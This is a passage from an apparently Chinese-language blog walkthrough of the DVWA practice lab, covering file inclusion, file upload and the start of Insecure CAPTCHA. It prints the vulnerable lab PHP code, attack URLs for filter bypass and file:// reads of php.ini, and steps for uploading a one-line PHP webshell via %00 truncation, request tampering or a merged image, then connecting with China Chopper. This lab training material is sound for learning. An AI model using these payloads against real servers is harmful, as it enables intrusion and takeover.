<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/DVWA-master/vulnerabilities/fi/?page=D:<span class="symbol">\p</span>hpStudy<span class="symbol">\W</span>WW<span class="symbol">\D</span>VWA-master<span class="symbol">\p</span>hp.ini</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/31.png" alt></p>
<p>2.远程文件包含</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">172.18</span>.<span class="number">9.91</span><span class="regexp">/DVWA-master/</span>vulnerabilities<span class="regexp">/fi/</span>?page=hthttp:<span class="regexp">//</span>tp:<span class="regexp">//</span><span class="number">172.18</span>.<span class="number">9.91</span><span class="regexp">/phpinfo.txt</span></span><br></pre></td></tr></table></figure>

<p>远程执行命令成功</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/32.png" alt></p>
<p>但是这边要注意编码后的URL不能绕过替换规则，因为解码实在浏览器端完成的，发送过去的page参数依然是<a href="http://172.18.9.91/phpinfo.txt，因此读取失败。" target="_blank" rel="noopener">http://172.18.9.91/phpinfo.txt，因此读取失败。</a></p>
<h3 id="High-3"><a href="#High-3" class="headerlink" title="High"></a>High</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">"file*"</span>, $file ) &amp;&amp; $file != <span class="string">"include.php"</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn't the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"ERROR: File not found!"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到，在High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件</p>
<p>漏洞利用</p>
<p>High级别的代码规定只能包含file开头的文件，看似安全，实际上可以使用file协议绕过防护策略，file协议是当我们浏览器打开一个本地文件时，用的就是file协议。因此构造playload</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">172.18</span>.<span class="number">9.91</span><span class="regexp">/DVWA-master/</span>vulnerabilities<span class="regexp">/fi/</span>?page=file:<span class="regexp">//</span><span class="regexp">/D:\phpStudy\WWW\DVWA-master\php.ini</span></span><br></pre></td></tr></table></figure>

<p>成功读取了服务器的配置文件</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/33.png" alt></p>
<p>至于执行任意命令，需要配合文件上传漏洞利用，首先需要上传一个内容为php的文件，然后再利用file协议去包含上传文件（需要知道上传文件的绝对路径），从而实现任意命令执行。</p>
<h3 id="Impossible-3"><a href="#Impossible-3" class="headerlink" title="Impossible"></a>Impossible</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Only allow include.php or file&#123;1..3&#125;.php</span></span><br><span class="line"><span class="keyword">if</span>( $file != <span class="string">"include.php"</span> &amp;&amp; $file != <span class="string">"file1.php"</span> &amp;&amp; $file != <span class="string">"file2.php"</span> &amp;&amp; $file != <span class="string">"file3.php"</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn't the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"ERROR: File not found!"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到，Impossible级别的代码使用白名单机制进行防护，page参数必须为“include.php”、”file1.php”、”file2.php”、”file3.php’’之一，彻底杜绝了文件包含漏洞。</p>
<h2 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h2><p>file upload，即文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都爆出过文件上传漏洞。</p>
<h3 id="Low-4"><a href="#Low-4" class="headerlink" title="Low"></a>Low</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">    <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], $target_path ) ) &#123;</span><br><span class="line">        <span class="comment">// No</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Yes!</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>相关函数</p>
<p>basename(path,suffix)</p>
<p>函数返回路径的文件名部分，如果可选参数为空，则返回的文件名包含后缀，反之不包含后缀。</p>
<p>可以看到，服务器对上传文件的类型、内容没有做任何检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应的提示信息。</p>
<p>漏洞利用</p>
<p>文件上传漏洞的利用是有限制条件的，首先是要能够成功上传木马文件，其次上传文件能够被执行，最后就是上传文件的路径必须可知，在low级别三个条件全部满足。</p>
<p>上传一句话木马文件hack.php</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/34.png" alt></p>
<p>上传成功，并且返回了上传路径</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/35.png" alt></p>
<p>使用中国菜刀进行连接，右键点击添加，地址栏处填入上传文件所在路径，参数名为test，然后菜刀就会通过向服务器发送包含test参数的post请求，在服务上执行任意命令，获取webshell权限，可下载、修改服务器的所有文件。</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/36.png" alt></p>
<p>可以打开服务器虚拟终端</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/37.png" alt></p>
<h3 id="Medium-4"><a href="#Medium-4" class="headerlink" title="Medium"></a>Medium</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ];</span><br><span class="line">    $uploaded_type = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'type'</span> ];</span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( $uploaded_type == <span class="string">"image/jpeg"</span> || $uploaded_type == <span class="string">"image/png"</span> ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], $target_path ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>从源码中看到，Medium级别的代码对上传文件的类型、大小做了限制，要求文件类型必须是jpeg或者png，且大小不能超过100000B（大约为97.6KB）</p>
<p>漏洞利用</p>
<p>1.组合拳（文件包含+文件上传）</p>
<p>因为采用的是一句话木马，所以文件大小不会产生问题，至于文件类型的检查，尝试修改文件名为hack.png,发现是可以上传成功的，但是在使用菜刀进行连接的时候发现，可以连接，但是没能获取到webshell权限，不能进行任何操作。</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/38.png" alt></p>
<p>中国菜刀的原理是向上传文件发送包含敏感参数的post请求，通过控制参数来执行不同的命令，而此处服务器将木马文件解析成图片文件，因此向其发送post请求时，服务器只会返回这个图片文件，并不会执行相应的命令。</p>
<p>想要让服务器将其解析为php文件，可以使用上面的文件包含漏洞进行，通过Medium级别的文件包含漏洞来获取webshell权限，右键添加，在地址栏中输入</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">172.18</span>.<span class="number">9.91</span><span class="regexp">/DVWA-master/</span>vulnerabilities<span class="regexp">/fi/</span>?page=hthttp:<span class="regexp">//</span>tp:<span class="regexp">//</span><span class="number">172.18</span>.<span class="number">9.91</span><span class="regexp">/DVWA-master/</span>hackable<span class="regexp">/uploads/</span>hack.png</span><br></pre></td></tr></table></figure>

<p>参数名test，脚本语言选择php</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/39.png" alt></p>
<p>打开，成功获取webshell权限</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/40.png" alt></p>
<p>2.抓包修改文件类型</p>
<p>上传hack.png文件，使用burpsuite抓包</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/41.png" alt></p>
<p>可以看到文件名后缀为png，文件类型为image/png，尝试修改filename为hack.php后发送，上传成功</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/42.png" alt></p>
<p>然后上菜刀，可以获得webshell权限。</p>
<p>3.截断绕过规则</p>
<p>在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断，所以可以把上传文件命名为hack.php%00.png可以看到，文件类型也是image/png，可以通过文件类型检查。</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/43.png" alt></p>
<p>上传成功</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/44.png" alt></p>
<p>而服务器会认为其文件名为hack.php，顺势解析为php文件。原理上面有讲过。</p>
<h3 id="High-4"><a href="#High-4" class="headerlink" title="High"></a>High</h3><p>服务器端源码</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// Where are we going to be writing to?</span></span></span><br><span class="line"><span class="php">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span></span><br><span class="line"><span class="php">    $target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="comment">// File information</span></span></span><br><span class="line"><span class="php">    $uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ];</span></span><br><span class="line"><span class="php">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">'.'</span> ) + <span class="number">1</span>);</span></span><br><span class="line"><span class="php">    $uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ];</span></span><br><span class="line"><span class="php">    $uploaded_tmp  = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ];</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="comment">// Is it an image?</span></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">"jpg"</span> || strtolower( $uploaded_ext ) == <span class="string">"jpeg"</span> || strtolower( $uploaded_ext ) == <span class="string">"png"</span> ) &amp;&amp;</span></span><br><span class="line"><span class="php">        ( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp;</span></span><br><span class="line"><span class="php">        getimagesize( $uploaded_tmp ) ) &#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">        <span class="comment">// Can we move the file to the upload folder?</span></span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123;</span></span><br><span class="line"><span class="php">            <span class="comment">// No</span></span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">            <span class="comment">// Yes!</span></span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">        <span class="comment">// Invalid file</span></span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>strrpos(string,find,start)</p>
<p>函数返回字符串find在另一字符串string中最后出现的位置，如果没有找到字符串则返回false，可选参数start规定在何处开始搜索。</p>
<p>getimagesize(string filename)</p>
<p>函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。可以看到，High级别的代码读取文件名中最后一个<code>.</code>后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是<code>*.jpg</code>、<code>.jpeg</code>、<code>.png</code>之一，同时，getimagesize函数会限制上传文件的文件头必须为图像类型。</p>
<p>漏洞利用</p>
<p>采用%00截断的方式可以轻松绕过文件名的检查，但是需要将上传文件的文件头伪装成图片，这边描述下借助High级别的文件包含漏洞完成攻击。</p>
<p>首先利用copy将一句话木马文件php.php与图片文件1.jpg合并生成hack.jpg,用一些工具像winhex等打开可以看到一句话木马藏到了最后。发现可以通过文件检查，并上传成功的。再使用菜刀连接，右键添加shell，地址栏填入：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">172.18</span>.<span class="number">9.91</span><span class="regexp">/DVWA-master/</span>vulnerabilities<span class="regexp">/fi/</span>?page=hthttp:<span class="regexp">//</span>tp:<span class="regexp">//</span><span class="number">172.18</span>.<span class="number">9.91</span><span class="regexp">/DVWA-master/</span>hackable<span class="regexp">/uploads/</span>hack.png</span><br></pre></td></tr></table></figure>

<p>填入一句话木马的参数名，脚本语言选择php,可以拿到webshell权限。</p>
<h3 id="Impossible-4"><a href="#Impossible-4" class="headerlink" title="Impossible"></a>Impossible</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ];</span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">'.'</span> ) + <span class="number">1</span>);</span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ];</span><br><span class="line">    $uploaded_type = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'type'</span> ];</span><br><span class="line">    $uploaded_tmp  = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path   = DVWA_WEB_PAGE_TO_ROOT . <span class="string">'hackable/uploads/'</span>;</span><br><span class="line">    <span class="comment">//$target_file   = basename( $uploaded_name, '.' . $uploaded_ext ) . '-';</span></span><br><span class="line">    $target_file   =  md5( uniqid() . $uploaded_name ) . <span class="string">'.'</span> . $uploaded_ext;</span><br><span class="line">    $temp_file     = ( ( ini_get( <span class="string">'upload_tmp_dir'</span> ) == <span class="string">''</span> ) ? ( sys_get_temp_dir() ) : ( ini_get( <span class="string">'upload_tmp_dir'</span> ) ) );</span><br><span class="line">    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . <span class="string">'.'</span> . $uploaded_ext;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">'jpg'</span> || strtolower( $uploaded_ext ) == <span class="string">'jpeg'</span> || strtolower( $uploaded_ext ) == <span class="string">'png'</span> ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">        ( $uploaded_type == <span class="string">'image/jpeg'</span> || $uploaded_type == <span class="string">'image/png'</span> ) &amp;&amp;</span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)</span></span><br><span class="line">        <span class="keyword">if</span>( $uploaded_type == <span class="string">'image/jpeg'</span> ) &#123;</span><br><span class="line">            $img = imagecreatefromjpeg( $uploaded_tmp );</span><br><span class="line">            imagejpeg( $img, $temp_file, <span class="number">100</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            $img = imagecreatefrompng( $uploaded_tmp );</span><br><span class="line">            imagepng( $img, $temp_file, <span class="number">9</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy( $img );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the web root from the temp folder?</span></span><br><span class="line">        <span class="keyword">if</span>( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;a href='$&#123;target_path&#125;$&#123;target_file&#125;'&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Delete any temp files</span></span><br><span class="line">        <span class="keyword">if</span>( file_exists( $temp_file ) )</span><br><span class="line">            unlink( $temp_file );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>in_get(varname)</p>
<p>函数返回相应选项的值</p>
<p>imagecreatefromjpeg(filename)</p>
<p>函数返回图片文件的图像标识，失败返回false</p>
<p>imagejpeg(image,filename,quality)</p>
<p>从image图像以filename为文件名创建一个jpeg图像，可选参数quality，范围从0（最差质量，文件更小）到100（最佳质量，文件最大）</p>
<p>imagedestroy(img)</p>
<p>函数销毁图像资源</p>
<p>可以看到，Impossible级别的代码对上传文件进行了重命名（为MD5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。</p>
<h2 id="Insecure-CAPTCHA"><a href="#Insecure-CAPTCHA" class="headerlink" title="Insecure CAPTCHA"></a>Insecure CAPTCHA</h2><p>Insecure CAPTCHA，意为不安全的验证码，CAPTCHA是Completely Automated Public Turing Test to Tell Computers and Humans Apart (全自动区分计算机和人类的图灵测试)的简称。</p>
<p>reCAPTCHA验证流程</p>
<p>该模块的验证码使用的是google提供的reCAPTCHA服务，下图是验证具体流程（借用freebuf上的一张图）</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/45.png" alt></p>
<p>服务器通过调用recaptcha_check_answer函数检查用户输入的正确性。</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">recaptcha_check_answer</span><span class="params">(<span class="variable">$privkey</span>,<span class="variable">$remoteip</span>, <span class="variable">$challenge</span>,<span class="variable">$response</span>)</span></span></span><br></pre></td></tr></table></figure>

<p>参数$privkey是服务器申请的private key,$remoteip是用户的ip，$challenge是recaptcha_response_field字段的值。函数返回ReCaptchaResponse class的实例，ReCaptchaResponse类有2个属性：</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><span class="meta-keyword">$is</span>_valid是布尔型的，表示校验是否有效</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$error</span>是返回的错误代码</span></span><br></pre></td></tr></table></figure>

<p>题目开启发现会有报错</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/46.png" alt></p>
<p>参考：<a href="https://blog.csdn.net/qq_43968080/article/details/104093581" target="_blank" rel="noopener">https://blog.csdn.net/qq_43968080/article/details/104093581</a></p>
<p>重启phpstudy就可以了。刷新发现会一直转圈，并发现有一个资源加载不出来，科学上网后资源加载出来了，但是好像刚刚输入的秘钥没用，验证码出不来，但是没关系，这边就是要绕过验证码</p>
